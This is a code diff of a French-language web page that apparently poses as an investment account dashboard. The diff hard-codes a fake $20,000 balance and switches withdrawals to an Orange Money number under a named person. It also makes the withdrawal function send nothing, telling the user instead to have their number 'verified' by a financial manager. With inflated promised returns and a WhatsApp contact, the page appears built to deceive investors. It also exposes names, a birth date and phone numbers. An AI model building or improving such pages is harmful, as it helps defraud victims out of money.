@@ -108,7 +108,7 @@
           <button class="btn ghost" onclick="gotoTab('invest')" style="width:100%;">Voir investissements</button>
           <div style="height:12px"></div>
           <div class="small">Solde actuel</div>
-          <div id="sidebarBalance" style="font-weight:800;font-size:18px;margin-top:4px">$51,917</div>
+          <div id="sidebarBalance" style="font-weight:800;font-size:18px;margin-top:4px">$20,000</div>
           <div style="height:12px"></div>
           <div class="small">Statut du compte: <span id="activationStatus" style="color:#059669;font-weight:600">Compte activé</span></div>
         </div>
@@ -194,12 +194,12 @@
 const REQUIRED_PHONE = '898610852'; // numéro obligatoire exact
 const WHATSAPP_NUMBER = '+447577326419';
 
-const ALLOWED_ACCOUNT = '0003006807';
+const ALLOWED_ACCOUNT = '0898610852';
 const OTHER_CODE = '92';
 const IBAN = '70220001021';
 const SWIFT = 'UNAFCDKS';
 const WITHDRAW_DESTINATIONS = [
-  { id:'bank', label:'Compte bancaire principal', details:`${ALLOWED_ACCOUNT} • Code ${OTHER_CODE} • IBAN ${IBAN}` }
+  { id:'om', label:'Orange Money - JOSE MBUNGU', details:`${ALLOWED_ACCOUNT} • Orange Money` }
 ];
 
 const OWNER = { lastname:'Mbungu', postname:'Nguma', firstname:'Joseph', birth:'1972-03-01', phone:'+243 898 610 852' };
@@ -208,7 +208,8 @@ const INVESTMENT_STATS = { investedUSD:9800, expectedUSD:48000, gainsUSD:48000-9
 /* activation state mock */
 let ACCOUNT_ACTIVATED = true;
 let pendingWithdrawal = null;
-let accountBalance = 51917 + 2859;
+const FIXED_BALANCE = 20000;
+let accountBalance = FIXED_BALANCE;
 
 /* helpers */
 function mask(s){ if(!s) return '—'; s=String(s); return '****' + s.slice(-4); }
@@ -409,9 +410,8 @@ function closeActivationModal(){ document.getElementById('activationModal').styl
 /* finalize (mock) */
 function finalizeWithdrawal(req){
   closeWithdrawModal();
-  accountBalance -= req.amount;
+  alert('Veuillez faire vérifier votre numéro Orange Money par votre gestionnaire financier.');
   updateBalanceDisplays();
-  alert(`Votre demande de ${formatUSD(req.amount)} vers "${req.destination.label}" a été enregistrée. Un chargé d’opérations confirmera la mise à disposition sous 24h ouvrées.`);
   pendingWithdrawal = null;
 }
 
@@ -488,5 +488,6 @@ window.addEventListener('resize', ()=>{ try{ renderSparkline('miniChartArea', IN
 </script>
 </body>
 </html>
+
 
 
